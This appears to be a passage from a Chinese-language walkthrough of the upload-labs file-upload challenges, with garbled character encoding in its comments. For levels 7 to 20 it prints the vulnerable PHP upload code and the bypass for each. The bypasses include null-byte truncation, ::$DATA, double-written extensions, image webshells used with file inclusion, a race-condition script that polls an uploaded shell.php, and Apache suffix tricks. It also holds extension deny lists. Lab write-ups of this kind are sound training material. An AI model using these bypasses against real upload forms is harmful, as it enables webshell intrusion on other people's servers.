array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \né»‘åå•,ä½†æ˜¯æ²¡æœ‰å»æ‰ç©ºæ ¼,ä½¿ç”¨ç©ºæ ¼ç»•è¿‡\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403273.png?token=ARYCSAU4TV7KUZUINL5LNKDCQCL6E)\n\n\n# pass-08\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \né»‘åå•,å»ç©ºæ ¼å¹¶ä¸”è½¬æ¢ä¸ºå°å†™,ä½†æ˜¯å¿½ç•¥äº†`.`,æ–‡ä»¶åå°¾åŠ .ç»•è¿‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403275.png?token=ARYCSAQ4CCYTTO62P7LIVTLCQCL7A)\n  \n# pass-09\n- æºç \n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n\n```\n\n- ä¸Šä¼ \nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šå»æ‰äº†. ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ç»•è¿‡`::$DATA`\n  phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+\"::$DATA\"ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ\"::$DATA\"ä¹‹å‰çš„æ–‡ä»¶å ä»–çš„ç›®çš„å°±æ˜¯ä¸æ£€æŸ¥åç¼€åã€‚\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151403711.png?token=ARYCSAS4OEIOWU727AX56T3CQCMAE)\n  \n\n# pass-10\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA\n        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n            }\n        } else {\n            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n\n```\n\n- ä¸Šä¼ \nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Š,ç¦æ­¢::$DATA,ä½†æ˜¯`deldot()`å‡½æ•°ä»åå‘å‰æ£€æµ‹ï¼Œå½“æ£€æµ‹åˆ°æœ«å°¾çš„ç¬¬ä¸€ä¸ªç‚¹æ—¶ä¼šç»§ç»­å®ƒçš„æ£€æµ‹ï¼Œä½†æ˜¯é‡åˆ°ç©ºæ ¼ä¼šåœä¸‹æ¥\n   ä½¿ç”¨pass-05çš„ç¬¬äºŒç§æ–¹æ³•,`. .`ç»•è¿‡\n  \n\n# pass-11\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n        }\n    } else {\n        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';\n    }\n}\n```\n\n- ä¸Šä¼ \nåˆ é™¤é»‘åå•ä¸­çš„å…³é”®å­—ä½†æ˜¯åªæ£€æµ‹ä¸€æ¬¡,ä½¿ç”¨åŒå†™ç»•è¿‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404428.png?token=ARYCSAUS5VMFYNA5CYFGISDCQCMB2)\n  \nä¸Šä¼ ä¹‹åå¾—åˆ°æ–‡ä»¶åshell.php\n\n# pass-12\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n        }\n    } else{\n        $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n    }\n}\n```\n\n- ä¸Šä¼ \nç™½åå•,æœ€åçš„è·¯å¾„æ˜¯é æ‹¼æ¥,å¯ä»¥ä½¿ç”¨%00æˆªæ–­\n  åŸç†ï¼šphpçš„ä¸€äº›å‡½æ•°çš„åº•å±‚æ˜¯Cè¯­è¨€ï¼Œè€Œmove_uploaded_fileå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼Œ0xè¡¨ç¤º16è¿›åˆ¶ï¼ŒURLä¸­%00è§£ç æˆ16è¿›åˆ¶å°±æ˜¯0x00ã€‚\n  \n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404815.png?token=ARYCSAQVS4V5C33H5LH4ZFTCQCMCS)\n\n# pass-13\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å¤±è´¥\";\n        }\n    } else {\n        $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n    }\n}\n\n```\n\n- ä¸Šä¼ \nä¸ä¸Šå…³ä¸€æ ·,åŒºåˆ«æ˜¯postæäº¤,postä¸ä¼šå¯¹é‡Œé¢çš„æ•°æ®è‡ªåŠ¨è§£ç ï¼Œéœ€è¦åœ¨Hexä¸­ä¿®æ”¹ã€‚\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151404058.png?token=ARYCSAVQMXGSSV33V76KGCLCQCMEA)\n  \n#pass-14\n- æºç \n```php\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //åªè¯»2å­—èŠ‚\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n```\n\n- ä¸Šä¼ \nä¼šåˆ¤æ–­å¼ºä¸¤ä¸ªå­—èŠ‚çš„æ¥ç¡®å®šä¸Šä¼ æ–‡ä»¶çš„åç¼€æ˜¯å¦ä¸ºç™½åå•é‡Œçš„,éœ€è¦ä¸Šä¼ å›¾ç‰‡é©¬é…åˆæ–‡ä»¶åŒ…å«æ¼æ´\n  ä¸Šä¼ å›¾ç‰‡é©¬\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151405347.png?token=ARYCSASXZ4555YJ443DI4V3CQCMEU)\n  ç‚¹å‡»æ–‡ä»¶åŒ…å«æ¼é“œ\n  ![](https://raw.githubusercontent.com/chencicici/images/main/202205151405579.png?token=ARYCSAWV6HXV2F2X3Q5SKV3CQCMFS)\n  \n# pass-15\n- æºç \n```php\nfunction isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)>=0){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n\n```\n- ä¸Šä¼ \nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Š,æ ¡éªŒå›¾ç‰‡çš„å¤§å°,ä¾æ—§å¯ä»¥å’Œä¸Šå…³ä¸€æ ·ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡\n  \n# pass-16\n- æºç \n```php\nfunction isImage($filename){\n    //éœ€è¦å¼€å¯php_exifæ¨¡å—\n    $image_type = exif_imagetype($filename);\n    switch ($image_type) {\n        case IMAGETYPE_GIF:\n            return \"gif\";\n            break;\n        case IMAGETYPE_JPEG:\n            return \"jpg\";\n            break;\n        case IMAGETYPE_PNG:\n            return \"png\";\n            break;    \n        default:\n            return false;\n            break;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }\n}\n\n```\n- ä¸Šä¼ \nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šå†æ£€æŸ¥åç¼€,ä¾æ—§ä½¿ç”¨å›¾ç‰‡é©¬ç»•è¿‡\n  \n# pass-17\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])){\n    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„\n    $filename = $_FILES['upload_file']['name'];\n    $filetype = $_FILES['upload_file']['type'];\n    $tmpname = $_FILES['upload_file']['tmp_name'];\n\n    $target_path=UPLOAD_PATH.'/'.basename($filename);\n\n    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å\n    $fileext= substr(strrchr($filename,\".\"),1);\n\n    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ\n    if(($fileext == \"jpg\") && ($filetype==\"image/jpeg\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡\n            $im = imagecreatefromjpeg($target_path);\n\n            if($im == false){\n                $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼\";\n                @unlink($target_path);\n            }else{\n                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å\n                srand(time());\n                $newfilename = strval(rand()).\".jpg\";\n                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagejpeg($im,$img_path);\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n\n    }else if(($fileext == \"png\") && ($filetype==\"image/png\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡\n            $im = imagecreatefrompng($target_path);\n\n            if($im == false){\n                $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼\";\n                @unlink($target_path);\n            }else{\n                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å\n                srand(time());\n                $newfilename = strval(rand()).\".png\";\n                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagepng($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;               \n            }\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n\n    }else if(($fileext == \"gif\") && ($filetype==\"image/gif\")){\n        if(move_uploaded_file($tmpname,$target_path)){\n            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡\n            $im = imagecreatefromgif($target_path);\n            if($im == false){\n                $msg = \"è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼\";\n                @unlink($target_path);\n            }else{\n                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å\n                srand(time());\n                $newfilename = strval(rand()).\".gif\";\n                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰\n                $img_path = UPLOAD_PATH.'/'.$newfilename;\n                imagegif($im,$img_path);\n\n                @unlink($target_path);\n                $is_upload = true;\n            }\n        } else {\n            $msg = \"ä¸Šä¼ å‡ºé”™ï¼\";\n        }\n    }else{\n        $msg = \"åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼\";\n    }\n}\n\n```\n- ä¸Šä¼ \nåŒä¸Š,å›¾ç‰‡é©¬ä¼ å°±å®Œäº‹äº†\n  \n# pass-18\n- æºç \n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = 'ä¸Šä¼ å‡ºé”™ï¼';\n    }\n}\n```\n- ä¸Šä¼ \nä»£ç å®¡è®¡,å¯¹ä¸Šä¼ çš„æ–‡ä»¶çš„åç¼€è¿›è¡Œå¯¹æ¯”,å¦‚æœä¸åœ¨ç™½åå•ä¹‹å†…å°±åˆ é™¤,æ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´,æ­¤å¤„åˆ©ç”¨æ¡ä»¶ç«äº‰\n  æ–‡ä»¶ä¸Šä¼ ,å†è¢«æ ¡éªŒä¸­é—´æ˜¯æœ‰ä¸€ä¸ªè¿‡ç¨‹çš„,å¦‚æœæˆ‘ä»¬åœ¨ä¸Šä¼ åç«‹å³è®¿é—®,å ç”¨æ–‡ä»¶,æ–‡ä»¶åœ¨è¢«ä½¿ç”¨çŠ¶æ€æ˜¯ä¸å¯è¢«åˆ é™¤çš„\n  åˆ©ç”¨burpé‡å¤å‘åŒ…,ä¸è®¾ç½®payload\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151405750.png?token=ARYCSAWD23GMFDRNJYLWY7TCQCMHA)\n  \n  åˆ©ç”¨è„šæœ¬å»é‡å¤è®¿é—®ä¸Šä¼ çš„webshellè·¯å¾„\n```python\nimport requests\n\nwhile True:\n    resp = requests.get(url='http://10.20.146.195/upload/shell.php')\n    if resp.status_code == 200:\n        print('æ”»å‡»æˆåŠŸ')\n        break\n    else:\n        continue\n```\n\n# pass-19\n- æºç \n```php\n//index.php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit']))\n{\n    require_once(\"./myupload.php\");\n    $imgFileName =time();\n    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);\n    $status_code = $u->upload(UPLOAD_PATH);\n    switch ($status_code) {\n        case 1:\n            $is_upload = true;\n            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;\n            break;\n        case 2:\n            $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚';\n            break; \n        case -1:\n            $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚';\n            break; \n        case -2:\n            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚';\n            break; \n        case -3:\n            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚';\n            break; \n        case -4:\n            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚';\n            break; \n        case -5:\n            $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚';\n            break; \n        case -6:\n            $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚';\n            break;      \n        default:\n            $msg = 'æœªçŸ¥é”™è¯¯ï¼';\n            break;\n    }\n}\n\n//myupload.php\nclass MyUpload{\n......\n......\n...... \n  var $cls_arr_ext_accepted = array(\n      \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\",\n      \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );\n\n......\n......\n......  \n  /** upload()\n   **\n   ** Method to upload the file.\n   ** This is the only method to call outside the class.\n   ** @para String name of directory we upload to\n   ** @returns void\n  **/\n  function upload( $dir ){\n    \n    $ret = $this->isUploadedFile();\n    \n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->setDir( $dir );\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkExtension();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );\n    }\n\n    $ret = $this->checkSize();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n    \n    // if flag to check if the file exists is set to 1\n    \n    if( $this->cls_file_exists == 1 ){\n      \n      $ret = $this->checkFileExists();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n\n    // if we are here, we are ready to move the file to destination\n\n    $ret = $this->move();\n    if( $ret != 1 ){\n      return $this->resultUpload( $ret );    \n    }\n\n    // check if we need to rename the file\n\n    if( $this->cls_rename_file == 1 ){\n      $ret = $this->renameFile();\n      if( $ret != 1 ){\n        return $this->resultUpload( $ret );    \n      }\n    }\n    \n    // if we are here, everything worked as planned :)\n\n    return $this->resultUpload( \"SUCCESS\" );\n  \n  }\n......\n......\n...... \n};\n\n```\nåŒä¸Šä¸€å…³,ä½†æ˜¯åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Š,å¯¹æ–‡ä»¶åè¿›è¡Œä¿®æ”¹,éœ€è¦é…åˆæ–‡ä»¶åŒ…å«æ¼æ´æˆ–å…¶ä»–æ¼æ´\nç»•è¿‡ç™½åå•è¿‡æ»¤ï¼šåˆ©ç”¨apacheçš„åç¼€åè¯†åˆ«æ¼æ´ â€”â€” ä»å³å¾€å·¦ä¾æ¬¡è¯†åˆ«åç¼€ï¼Œé‡åˆ°ä¸èƒ½è¯†åˆ«çš„åç¼€åä¾¿è·³è¿‡ ï¼Œå› æ­¤å¯ä»¥æ–‡ä»¶åæ”¹ä¸ºcreate.php.7zï¼ˆ.7zè¿™ä¸ªåç¼€apacheä¸èƒ½è¯†åˆ«ï¼‰\n\n\n# pass-20\n- æºç \n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = 